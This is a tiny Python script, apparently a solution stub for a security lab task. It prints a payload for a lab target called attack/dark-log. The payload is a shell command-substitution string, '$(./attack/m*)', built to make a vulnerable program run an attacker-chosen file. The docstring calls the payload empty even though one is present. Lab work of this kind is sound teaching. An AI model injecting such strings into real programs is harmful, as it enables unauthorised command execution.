#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"$(./attack/m*)\n"

sys.stdout.buffer.write(payload)
